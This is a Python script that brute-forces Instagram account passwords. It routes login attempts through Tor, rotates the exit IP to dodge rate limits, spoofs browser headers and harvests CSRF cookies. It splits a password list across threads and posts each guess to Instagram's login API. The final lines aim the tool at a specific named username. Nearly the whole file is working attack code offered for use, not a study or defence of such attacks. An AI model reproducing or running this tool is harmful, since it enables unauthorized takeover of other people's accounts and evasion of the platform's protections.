#!/usr/bin/python3
import os
from timeit import default_timer
from shutil import which
from stem.control import Controller
from stem import Signal
import requests
import json
import _thread
import time

class Tor:
    """
    Tor controlling class
    """

    def __init__(self, cport: int, hport: int, timeout=20):
        self.cport = cport
        self.hport = hport
        self.timeout = timeout
        if which("tor") == None:
            raise OSError("Tor not found")

    def change_ip(self):
        with Controller.from_port(port=self.cport) as c:
            c.authenticate()
            c.signal(Signal.NEWNYM)

    def start(self):
        self.stop()
        self.mktemp_config()
        os.system("{} -f .torrc > .stdout &".format(which("tor")))
        start_time = default_timer()
        while True:
            with open(".stdout", "r") as file:
                lines = file.read().split("\n")
                if len(lines) > 3 and "Bootstrapped 100%" in lines[-2]:
                    return "Started"
                else:
                    if abs(start_time - default_timer()) > self.timeout:
                        self.stop()
                        return "Timeout"
                    else:
                        continue
                file.close()

    def mktemp_config(self):
        file = open(".torrc", "w")
        file.write("ControlPort {}\nHTTPTunnelPort {}".format(self.cport, self.hport))
        file.close()

    def stop(self):
        return os.system(
            "pkill {} > /dev/null 2>&1 ".format(os.path.basename(which("tor")))
        )

    def proxy(self):
        return {
            "http": "http://localhost:{}".format(self.hport),
            "https": "http://localhost:{}".format(self.hport),
        }


class Instagram:
    """
    Instagram controller
    """

    current_trying = ""
    tested_passwords = 0
    ended = 0

    def __init__(self, username, use_tor=None):
        self.use_tor = use_tor
        self.username = username
        self.session = requests.session()
        self.session.max_redirects = 500
        self.head_pre = {
            "Host": "i.instagram.com",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "x-asbd-id,x-csrftoken,x-ig-app-id,x-ig-www-claim,x-instagram-ajax",
            "Referer": "https://www.instagram.com/",
            "Origin": "https://www.instagram.com",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "TE": "trailers",
        }
        if self.use_tor is not None:
            self.session.proxies = self.use_tor.proxy()

    def ipaddr(self) -> str:
        return self.session.get("https://httpbin.org/ip",proxies=self.use_tor.proxy()).json()["origin"]

    def split_passwords(self, passwords, noft) -> list:
        chunk_size = len(passwords) // noft
        if chunk_size > 0:
            return [
                passwords[i : i + chunk_size]
                for i in range(0, len(passwords), chunk_size)
            ]
        else:
            return [passwords]

    def bruteforce(self, threads, passlist):
        with open(passlist, "r") as file:
            passwords = file.read()
        temp = self.split_passwords(passwords.split("\n"), threads)
        for passwords_ in temp:
            _thread.start_new_thread(lambda: self.try_passwords(passwords_), ())
        while True:
            os.system("clear")
            print(
                "\rCurrent Trying : {}\n Total Tried : {}".format(
                    self.current_trying, self.tested_passwords
                ),
                end="",
            )
            time.sleep(0.1)
            if self.ended == len(temp):
                os.system("clear")
                exit("Bad luck")

    def try_passwords(self, passwords):
        for password in passwords:
            if password == "\n":
                continue
            self.current_trying = password

            def test(passw):
                try:
                    try_ = self.login(passw)
                except Exception:
                    test(passw)
                if (
                    try_["message"]
                    != "Sorry, your password was incorrect. Please double-check your password."
                ):
                    print(try_)
                    exit()

            test(password)
            self.tested_passwords += 1
        self.ended += 1

    def get_cookies(self):
        self.session.post(
            "https://i.instagram.com/api/v1/web/accounts/login/ajax/",
            headers=self.head_pre,
        )
        cookies = self.session.cookies.get_dict()
        if "csrftoken1" in cookies.keys():
            with open(".cookie", "w") as file:
                file.write(str(cookies).replace("'", '"'))
                file.close
        else:
            with open(".cookie", "r") as file:
                cookies = json.load(file)
                file.close()
        return cookies

    def get_universal_headers(self):
        response_cookies = self.get_cookies()
        return {
            "Host": "i.instagram.com",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "X-CSRFToken": response_cookies["csrftoken"],
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "324",
            "Origin": "https://www.instagram.com",
            "Alt-Used": "i.instagram.com",
            "Connection": "keep-alive",
            "Referer": "https://www.instagram.com/",
            "Cookie": "ig_did={}; ig_nrcb={}; mid={}; csrftoken={}".format(
                response_cookies["ig_did"],
                response_cookies["ig_nrcb"],
                response_cookies["mid"],
                response_cookies["csrftoken"],
            ),
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "TE": "trailers",
        }

    def login(self, password) -> dict:
        print(self.ipaddr())
        url = "https://i.instagram.com/api/v1/web/accounts/login/ajax/"
        data = {
            "username": f"{self.username}",
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{time.time()}:{password}",
            "queryParams": "{}",
            "optIntoOneTap": "false",
        }
        head_post = self.get_universal_headers()
        return self.session.post(
            url, data=data, headers=head_post, cookies=self.session.cookies
        ).json()


tor = Tor(9876, 4949)
tor.start()
ig = Instagram("cyberdioxide", use_tor=tor)

for i in range(1, 20):
    tor.change_ip()
    print(ig.login("tessss" + str(i)))

print("final")
print(ig.login("yarabs1256"))
